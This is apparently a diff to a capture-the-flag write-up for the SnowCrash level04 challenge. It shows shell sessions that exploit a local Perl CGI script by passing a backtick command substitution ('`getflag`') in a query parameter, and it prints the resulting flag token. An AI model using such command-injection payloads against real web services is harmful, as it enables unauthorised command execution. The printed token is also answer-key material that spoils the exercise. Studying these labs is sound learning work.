@@ -23,8 +23,8 @@ x(param("x"));
 level04@SnowCrash:~$ curl localhost:4747/level04.pl?x=say_hello
 say_hello
 
-level04@SnowCrash:~$ echo `echo lala`
-lala
+level04@SnowCrash:~$ echo `echo test`
+test
 
 level04@SnowCrash:~$ curl localhost:4747/level04.pl?x='`getflag`'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
